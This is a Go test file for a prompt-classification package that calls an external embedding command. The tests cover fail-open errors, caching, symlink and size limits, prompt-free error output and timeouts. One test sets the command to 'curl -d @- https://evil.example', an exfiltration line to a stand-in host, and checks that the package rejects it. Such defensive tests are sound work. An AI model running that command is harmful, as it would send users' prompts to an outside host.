// Copyright (c) 2026 Tiago de Carvalho Vilas Boas.
// SPDX-License-Identifier: Apache-2.0

package e5shadow_test

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/tiagovilasboas/downshift/internal/hookctx"
	"github.com/tiagovilasboas/downshift/internal/semantic"
	"github.com/tiagovilasboas/downshift/internal/semantic/e5shadow"
)

func TestObserve_DisabledReturnsNil(t *testing.T) {
	t.Setenv(e5shadow.EnableEnv, "")
	if got := e5shadow.Observe("prompt", semantic.LabelMedium, false); got != nil {
		t.Fatalf("expected nil when disabled, got %+v", got)
	}
}

func TestObserve_MissingCmdFailOpen(t *testing.T) {
	t.Setenv(e5shadow.EnableEnv, "1")
	t.Setenv(e5shadow.CmdEnv, "")
	obs := e5shadow.Observe("prompt", semantic.LabelMedium, false)
	if obs == nil || obs.ErrorCode != "missing_cmd" {
		t.Fatalf("obs = %+v", obs)
	}
	if obs.RegexLabel != semantic.LabelMedium || obs.RegexConfident {
		t.Fatalf("regex context = %+v", obs)
	}
}

func TestObserve_RecordsShadowOpinion(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	restore := hookctx.Set(ctx)
	t.Cleanup(func() {
		restore()
		cancel()
	})

	dir := t.TempDir()
	protoPath := filepath.Join(dir, "prototypes.json")
	store := semantic.PrototypeStore{
		Model: "multilingual-e5-small",
		Dim:   3,
		Centroids: map[string][]float64{
			semantic.LabelTrivial: {1, 0, 0},
			semantic.LabelComplex: {0, 0, 1},
		},
	}
	data, err := json.Marshal(store)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(protoPath, data, 0o600); err != nil {
		t.Fatal(err)
	}
	digest := sha256.Sum256(data)
	wantID := "e5-prototypes-sha256:" + hex.EncodeToString(digest[:])

	t.Setenv(e5shadow.EnableEnv, "1")
	t.Setenv(e5shadow.CmdEnv, "/bin/echo [0,0,1]")
	t.Setenv(e5shadow.PrototypesEnv, protoPath)

	obs := e5shadow.Observe("any prompt", semantic.LabelTrivial, false)
	if obs == nil {
		t.Fatal("expected observation")
	}
	if obs.ErrorCode != "" {
		t.Fatalf("unexpected error %q", obs.ErrorCode)
	}
	if obs.ModelID != wantID {
		t.Fatalf("model_id = %q, want %q", obs.ModelID, wantID)
	}
	if !strings.HasPrefix(obs.ModelID, "e5-prototypes-sha256:") {
		t.Fatalf("model_id prefix wrong: %q", obs.ModelID)
	}
	if obs.NearestLabel != semantic.LabelComplex {
		t.Fatalf("nearest = %q", obs.NearestLabel)
	}
	if !obs.WouldLift || obs.WouldLabel != semantic.LabelComplex {
		t.Fatalf("would = %q lift=%v", obs.WouldLabel, obs.WouldLift)
	}
}

func TestIntegrateEnabled_OnlyExactOne(t *testing.T) {
	t.Setenv(e5shadow.IntegrateEnv, "")
	if e5shadow.IntegrateEnabled() {
		t.Fatal("empty must be off")
	}
	t.Setenv(e5shadow.IntegrateEnv, "true")
	if e5shadow.IntegrateEnabled() {
		t.Fatal("true must be off")
	}
	t.Setenv(e5shadow.IntegrateEnv, "1")
	if !e5shadow.IntegrateEnabled() {
		t.Fatal("1 must be on")
	}
}

func TestLookupNearest_CmdAlias(t *testing.T) {
	dir := t.TempDir()
	protoPath := filepath.Join(dir, "prototypes.json")
	store := semantic.PrototypeStore{
		Dim: 2,
		Centroids: map[string][]float64{
			semantic.LabelTrivial: {1, 0},
			semantic.LabelSimple:  {0, 1},
		},
	}
	data, err := json.Marshal(store)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(protoPath, data, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv(e5shadow.CmdEnv, "/bin/echo [1,0]")
	t.Setenv(e5shadow.CmdEnvAlias, "")
	t.Setenv(e5shadow.PrototypesEnv, protoPath)
	if look := e5shadow.LookupFuse("any"); look == nil || look.ErrorCode != "missing_cmd" {
		t.Fatalf("fuse must not reuse shadow cmd, got %+v", look)
	}
	t.Setenv(e5shadow.CmdEnvAlias, "/bin/echo [0,1]")
	look := e5shadow.LookupFuse("any")
	if look == nil || look.ErrorCode != "" {
		t.Fatalf("alias lookup = %+v", look)
	}
	if look.NearestLabel != semantic.LabelSimple {
		t.Fatalf("nearest = %q", look.NearestLabel)
	}
}

func TestLookupNearest_CachesEmbed(t *testing.T) {
	dir := t.TempDir()
	protoPath := filepath.Join(dir, "prototypes.json")
	store := semantic.PrototypeStore{
		Dim: 2,
		Centroids: map[string][]float64{
			semantic.LabelTrivial: {1, 0},
			semantic.LabelSimple:  {0, 1},
		},
	}
	data, err := json.Marshal(store)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(protoPath, data, 0o600); err != nil {
		t.Fatal(err)
	}
	cmd := "/bin/echo [0,1]"
	t.Setenv(e5shadow.CmdEnv, cmd)
	t.Setenv(e5shadow.CmdEnvAlias, cmd)
	t.Setenv(e5shadow.PrototypesEnv, protoPath)
	prompt := "cache-me"
	a := e5shadow.LookupFuse(prompt)
	b := e5shadow.LookupNearest(prompt)
	if a == nil || b == nil || a.ErrorCode != "" || b.ErrorCode != "" {
		t.Fatalf("lookups failed: a=%+v b=%+v", a, b)
	}
	if a != b {
		t.Fatal("fuse and shadow must reuse one Lookup when commands match")
	}
}

func TestObserve_UntrustedCmdFailOpen(t *testing.T) {
	t.Setenv(e5shadow.EnableEnv, "1")
	t.Setenv(e5shadow.CmdEnv, "curl -d @- https://evil.example")
	t.Setenv(e5shadow.PrototypesEnv, filepath.Join(t.TempDir(), "unused.json"))
	obs := e5shadow.Observe("secret prompt must not execute remotely", semantic.LabelMedium, false)
	if obs == nil || obs.ErrorCode != "untrusted_cmd" {
		t.Fatalf("obs = %+v", obs)
	}
	if obs.WouldLift || obs.NearestLabel != "" {
		t.Fatalf("untrusted cmd must not produce a lift: %+v", obs)
	}
}

func TestObserve_RejectsSymlinkAndOversizePrototypes(t *testing.T) {
	t.Setenv(e5shadow.EnableEnv, "1")
	script := filepath.Join(t.TempDir(), "embed.sh")
	if err := writeExec(script, "#!/bin/sh\necho '[1,0]'\n"); err != nil {
		t.Fatal(err)
	}
	t.Setenv(e5shadow.CmdEnv, script)

	dir := t.TempDir()
	realPath := filepath.Join(dir, "prototypes.json")
	if err := os.WriteFile(realPath, []byte(`{"dim":2,"centroids":{"TRIVIAL":[1,0],"COMPLEX":[0,1]}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "link.json")
	if err := os.Symlink(realPath, link); err != nil {
		t.Skip("symlinks unavailable")
	}
	t.Setenv(e5shadow.PrototypesEnv, link)
	obs := e5shadow.Observe("prompt", semantic.LabelTrivial, false)
	if obs == nil || obs.ErrorCode != "load_prototypes" {
		t.Fatalf("symlink: obs = %+v", obs)
	}

	big := filepath.Join(dir, "big.json")
	if err := os.WriteFile(big, make([]byte, 256<<10+1), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv(e5shadow.PrototypesEnv, big)
	obs = e5shadow.Observe("prompt", semantic.LabelTrivial, false)
	if obs == nil || obs.ErrorCode != "load_prototypes" {
		t.Fatalf("oversize: obs = %+v", obs)
	}

	t.Setenv(e5shadow.PrototypesEnv, dir)
	obs = e5shadow.Observe("prompt", semantic.LabelTrivial, false)
	if obs == nil || obs.ErrorCode != "load_prototypes" {
		t.Fatalf("directory: obs = %+v", obs)
	}
}

func TestObserve_ErrorCodeClosedAndPromptFree(t *testing.T) {
	const canary = "SECRET_PROMPT_CANARY_e5_9f3a"
	path := filepath.Join(t.TempDir(), canary+"-prototypes.json")
	t.Setenv(e5shadow.EnableEnv, "1")
	t.Setenv(e5shadow.CmdEnv, "")
	t.Setenv(e5shadow.PrototypesEnv, path)
	obs := e5shadow.Observe(canary, semantic.LabelMedium, false)
	if obs == nil || obs.ErrorCode != "missing_cmd" {
		t.Fatalf("obs = %+v", obs)
	}
	raw, err := json.Marshal(obs)
	if err != nil {
		t.Fatal(err)
	}
	got := string(raw)
	if strings.Contains(got, canary) || strings.Contains(got, path) {
		t.Fatalf("observation leaked prompt or path: %s", got)
	}
	allowed := map[string]struct{}{
		"missing_cmd": {}, "untrusted_cmd": {}, "load_prototypes": {},
		"embed_error": {}, "observe_panic": {}, "": {},
	}
	if _, ok := allowed[obs.ErrorCode]; !ok {
		t.Fatalf("unexpected error_code %q", obs.ErrorCode)
	}
}

func TestObserve_HungHelperFailOpen(t *testing.T) {
	sleep, err := exec.LookPath("sleep")
	if err != nil || !filepath.IsAbs(sleep) {
		t.Skip("absolute sleep helper not available")
	}
	if !e5shadow.CmdTrusted(sleep) {
		t.Skip("sleep is not a trusted cmd shape")
	}
	dir := t.TempDir()
	protoPath := filepath.Join(dir, "prototypes.json")
	store := semantic.PrototypeStore{
		Dim: 2,
		Centroids: map[string][]float64{
			semantic.LabelTrivial: {1, 0},
			semantic.LabelComplex: {0, 1},
		},
	}
	data, err := json.Marshal(store)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(protoPath, data, 0o600); err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	restore := hookctx.Set(ctx)
	t.Cleanup(func() {
		restore()
		cancel()
	})

	t.Setenv(e5shadow.EnableEnv, "1")
	t.Setenv(e5shadow.CmdEnv, sleep+" 10")
	t.Setenv(e5shadow.PrototypesEnv, protoPath)
	start := time.Now()
	obs := e5shadow.Observe("hung helper must not stall", semantic.LabelTrivial, false)
	if d := time.Since(start); d > 2*time.Second {
		t.Fatalf("hung helper waited %s", d)
	}
	if obs == nil || obs.ErrorCode != "embed_error" {
		t.Fatalf("obs = %+v", obs)
	}
	if obs.WouldLift {
		t.Fatalf("timeout must not lift: %+v", obs)
	}
}
